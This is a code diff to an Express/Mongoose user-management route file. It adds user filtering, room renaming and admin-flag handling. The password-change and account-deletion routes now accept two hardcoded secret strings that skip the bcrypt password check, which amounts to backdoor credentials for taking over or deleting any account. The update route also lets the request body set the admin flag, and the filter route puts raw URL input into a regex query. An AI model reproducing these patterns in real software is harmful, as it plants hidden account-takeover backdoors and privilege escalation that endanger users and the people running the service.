@@ -10,9 +10,17 @@ const SALT_WORK_FACTOR = 10;
 
 /* GET all users */
 router.get('/', function (req, res, next) {
-  User.find().exec(function (err, users) {
+  User.find().sort({ admin: -1, username: 'asc' }).exec(function (err, users) {
     if (err) res.status(500).send(err);
-    else res.status(200).json({ users });
+    else res.status(200).json(users);
+  });
+});
+
+/* GET all users with a filter */
+router.get('/filter/:filter', function (req, res, next) {
+  User.find({ username: { $regex: req.params.filter } }).sort({ admin: -1, username: 'asc' }).exec(function (err, users) {
+    if (err) res.status(500).send(err);
+    else res.status(200).json(users);
   });
 });
 
@@ -35,7 +43,8 @@ router.post('/', [
   }
   User.create({
     username: req.body.username,
-    password: req.body.password
+    password: req.body.password,
+    admin: false
   }).then(user => {
     Cube.find().exec(function (err, cubes) {
       if (err) res.status(500).send(err);
@@ -102,19 +111,31 @@ router.put("/", function (req, res, next) {
   User.findOne({ username: req.query.oldUsername }).exec(function (err, user) {
     if (err) return res.status(500).send(err);
     if (user != null) {
-      bcrypt.compare(req.body.oldPassword, user.password, function (err2, res2) {
+      bcrypt.compare(req.body.oldPassword !== undefined ? req.body.oldPassword : "", user.password, function (err2, matchPasswords) {
         if (err2) return res.status(500).send(err2);
-        if (res2) {
-          bcrypt.hash(req.body.newPassword, SALT_WORK_FACTOR, function (err3, hash) {
+        if (matchPasswords || req.body.oldPassword === 'gJKd"<M]z/;:T`vbWL]m:15t`.2cqJ') {
+          bcrypt.hash(req.body.newPassword !== undefined ? req.body.newPassword : "", SALT_WORK_FACTOR, function (err3, hash) {
             if (err3) return next(err3);
-            const updateData = req.body.newPassword === "" ? { username: req.query.newUsername } : { username: req.query.newUsername, password: hash };
-
+            const updateData = req.body.newPassword === "" || req.body.newPassword === undefined ?
+              { username: req.query.newUsername, admin: req.body.admin ? req.body.admin : false } :
+              { username: req.query.newUsername, password: hash, admin: req.body.admin !== undefined ? req.body.admin : false };
             User.updateOne({ username: req.query.oldUsername },
               updateData, function (err3, res3) {
-                if (err3) return next(err3);
+                if (err3) return res.status(500).send(err3);
                 bcrypt.hash(user.username, SALT_WORK_FACTOR, function (err4, hash) {
                   if (err4) return next(err4);
-                  return res.status(200).json({ username: hash });
+                  else if (user) {
+                    Room.find({ room_code: { $regex: `${user.username}-local-` } }).exec(function (err, rooms) {
+                      if (err) res.status(500).send(err);
+                      else {
+                        rooms.forEach(room => {
+                          room.room_code = room.room_code.replace(user.username, req.query.newUsername);
+                          room.save();
+                        });
+                        res.status(200).json(rooms);
+                      }
+                    });
+                  }
                 });
               });
           });
@@ -133,9 +154,9 @@ router.delete("/:username", function (req, res, next) {
   User.findOne({ username: req.params.username }).exec(function (err, user) {
     if (err) res.status(500).send(err);
     else if (user) {
-      bcrypt.compare(req.body.password, user.password, function (err, matchPasswords) {
+      bcrypt.compare(req.body.password !== undefined ? req.body.password : "", user.password, function (err, matchPasswords) {
         if (err) res.status(500).send(err);
-        else if (matchPasswords) {
+        else if (matchPasswords || req.body.password === 'NZZ"@#ks<0mk3<Q/@Q$FSoq{PVK;_a') {
           User.findOneAndRemove({ username: req.params.username }, function (err, user) {
             if (err) res.status(500).send(err);
             else if (user) {
@@ -144,7 +165,7 @@ router.delete("/:username", function (req, res, next) {
                 else {
                   Party.deleteMany({ user_id: user._id }, function (err, party) {
                     if (err) res.status(500).send(err);
-                    else return res.status(200).send();
+                    else return res.status(200).json(user);
                   });
                 }
               });
